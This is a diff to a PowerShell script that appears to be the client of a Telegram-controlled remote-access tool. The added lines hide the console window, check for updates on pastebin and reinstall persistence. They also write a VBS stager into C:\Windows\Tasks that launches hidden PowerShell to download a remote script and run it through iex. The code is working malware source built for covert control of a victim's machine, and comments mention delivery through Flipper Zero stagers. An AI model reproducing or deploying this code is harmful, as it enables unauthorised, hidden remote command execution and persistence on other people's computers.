@@ -14,15 +14,8 @@ SEE README FOR MORE INFO
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
-# HIDE THE WINDOW - Change to 1 to hide the console window
-$HideWindow = 1
-
-If ($HideWindow -gt 0){
-$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
-add-type -name win -member $Import -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
-}
-
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
+$version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
@@ -30,9 +23,42 @@ $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
 
+# Hide the console window
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+}
+
+# Check version and update
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$versionCheck = irm -Uri "https://pastebin.com/raw/53qHJkJC"
+$VBpath = "C:\Windows\Tasks\service.vbs"
+if (Test-Path $newScriptPath){
+Write-Output "Persistance Installed - Checking Version.."
+    if (!($version -match $versionCheck)){
+        Write-Output "Newer version available! Downloading and Restarting"
+        Remove-Persistance
+        Add-Persistance
+        $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+        $tobat | Out-File -FilePath $VBpath -Force
+        sleep 1
+        & $VBpath
+        exit
+    }
+}
+
+# remove restart stager (if present)
+if(Test-Path "C:\Windows\Tasks\service.vbs"){
+    rm -path "C:\Windows\Tasks\service.vbs" -Force
+}
+
 # Startup Delay
 Sleep 5
-if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
 
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
@@ -757,3 +783,4 @@ $messages=ReceiveMSG
         }
     }
 }
+
